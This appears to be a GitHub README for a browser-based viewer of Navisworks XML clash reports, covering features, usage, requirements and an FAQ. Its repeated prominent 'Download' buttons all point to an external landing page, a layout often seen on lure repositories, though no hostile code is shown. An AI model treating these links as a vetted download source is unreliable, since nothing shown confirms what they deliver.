# Clash Matrix Analyzer v2026 - web app 2026

> **A browser-based matrix viewer for Navisworks XML clash reports, with hierarchical grouping, filtering, search, and CSV export in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/woodsam45/navisworks-clash-analyzer-v2026?style=flat-square)](https://github.com/woodsam45/navisworks-clash-analyzer-v2026)

---

<p align="center">
  <a href="https://woodsam45.github.io/navisworks-clash-analyzer-v2026/">
    <img src="https://img.shields.io/badge/Download-Clash%20Matrix%20Analyzer%20Latest-brightgreen?style=for-the-badge" alt="Download Clash Matrix Analyzer">
  </a>
</p>

> **[Direct Download - Clash Matrix Analyzer v2026](https://woodsam45.github.io/navisworks-clash-analyzer-v2026/)**

---

[Download Latest Build](https://woodsam45.github.io/navisworks-clash-analyzer-v2026/)

---

## Overview

Clash Matrix Analyzer is a self-contained web app built for inspecting collision data exported from Autodesk Navisworks as XML. It turns clash reports into a matrix-style interface, making it easier to compare Element 1 and Element 2 through grouped rows, grouped columns, and readable intersection totals.

It is meant to bridge the gap between raw XML output and a more usable analysis view. Since it ships as a single HTML file that runs in the browser, you can open it quickly, share it easily, and skip any separate installation process.

---

## What it can do

- Standalone single-file HTML application
- Loads Navisworks XML clash reports
- Builds a matrix view from collision data
- Supports hierarchical row and column grouping by item properties
- Lets you reorder hierarchy levels with drag and drop
- Uses multi-level table headers with merged cells
- Includes global filters and property-based filters
- Searches across all collision-related fields
- Keeps headers fixed and left columns frozen for easier navigation
- Counts collisions at matrix intersections
- Exports results to CSV
- Reads dynamic XML fields from `objectattribute` and `smarttags`

---

## Getting started

1. Download or clone the repository.
2. Open the main HTML file in a modern browser.
3. Load a Navisworks XML clash report from the interface.

If you prefer to run it locally, put the HTML file in a folder and open it directly or serve it with a basic static web server.

---

## How to use it

1. Open the app in your browser.
2. Import an XML clash report exported from Navisworks.
3. Select the grouping strategy for rows and columns.
4. Drag grouping levels to change their order.
5. Apply global or property-based filters to narrow the matrix.
6. Use search to find specific collision records.
7. Check the counts at each intersection and export the filtered data to CSV when required.

Common workflow:

- Load report
- Adjust hierarchy
- Filter and search
- Inspect collision distribution
- Export for further analysis

---

## Configuration

The app is intended to remain a self-contained HTML experience, so most controls live in the interface instead of a separate configuration file.

When adjusting the workflow, focus on:

- grouping controls for row and column structure
- filter inputs for report narrowing
- search tools for field-wide lookup
- export actions for CSV output

---

## Requirements

- A modern browser
- Navisworks XML clash report files
- Enough local memory and browser capacity for the size of the report being analyzed
- No additional runtime is required beyond the browser

---

## FAQ

**How do I update the app?**  
Download the latest build from the project page and replace your current copy of the HTML file.

**Where are settings stored?**  
The app is designed as a browser-based standalone file, so configuration is handled in the interface unless you add your own local customization.

**What file type does it accept?**  
It works with XML clash reports exported from Autodesk Navisworks.

**What if a report is large or slow to load?**  
Reduce the amount of data you inspect at once by using filters, search, and grouping controls to focus on the collisions that matter.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
